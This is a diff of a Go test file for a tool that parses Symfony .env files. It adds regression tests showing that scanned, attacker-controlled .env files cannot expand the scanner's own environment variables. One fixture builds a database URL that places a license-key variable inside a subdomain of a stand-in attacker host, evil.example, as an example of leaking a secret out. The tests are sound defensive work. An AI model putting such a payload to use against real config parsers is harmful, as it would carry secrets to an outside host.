@@ -1,9 +1,12 @@
 package gocommerce
 
 import (
+	"os"
+	"path/filepath"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
+	"github.com/stretchr/testify/require"
 )
 
 func TestSymfonyEnvVars(t *testing.T) {
@@ -58,9 +61,38 @@ func TestExpandSymfonyVars(t *testing.T) {
 	}
 }
 
-func TestExpandSymfonyVarsPrefersRealEnv(t *testing.T) {
+// A scanned .env is attacker-controlled input, so it may not read the scanner's
+// own environment - see freshdesk 53553.
+func TestExpandSymfonyVarsIgnoresProcessEnv(t *testing.T) {
 	t.Setenv("DB_HOST", "10.0.0.9")
-	assert.Equal(t, "10.0.0.9", expandSymfonyVars("${DB_HOST}", map[string]string{"DB_HOST": "db.internal"}))
+	t.Setenv("ECOMSCAN_KEY", "zz-license-key")
+
+	assert.Equal(t, "db.internal", expandSymfonyVars("${DB_HOST}", map[string]string{"DB_HOST": "db.internal"}))
+	assert.Equal(t, "", expandSymfonyVars("${ECOMSCAN_KEY}", nil))
+	assert.Equal(t, "fallback", expandSymfonyVars("${ECOMSCAN_KEY:-fallback}", nil))
+}
+
+func TestSymfonyParseConfigKeepsProcessEnvOutOfDSN(t *testing.T) {
+	t.Setenv("DATABASE_URL", "")
+	t.Setenv("ECOMSCAN_KEY", "zz-license-key")
+
+	write := func(t *testing.T, dsn string) string {
+		t.Helper()
+		p := filepath.Join(t.TempDir(), ".env")
+		require.NoError(t, os.WriteFile(p, []byte("DATABASE_URL=\""+dsn+"\"\n"), 0o644))
+		return p
+	}
+
+	// nothing is left to connect to when every field came from the environment
+	cfg, err := symfonyParseConfig(write(t, "mysql://${ECOMSCAN_KEY}:x@${ECOMSCAN_KEY}.evil.example/owned"))
+	assert.Error(t, err)
+	assert.Nil(t, cfg)
+
+	// and a DSN that does parse carries none of it
+	cfg, err = symfonyParseConfig(write(t, "mysql://u:p@db.internal/shop_${ECOMSCAN_KEY}"))
+	require.NoError(t, err)
+	assert.Equal(t, "shop_", cfg.DB.Name)
+	assert.NotContains(t, cfg.DB.DSN(), "zz-license-key")
 }
 
 func TestParseSymfonyDSNEmptyPort(t *testing.T) {
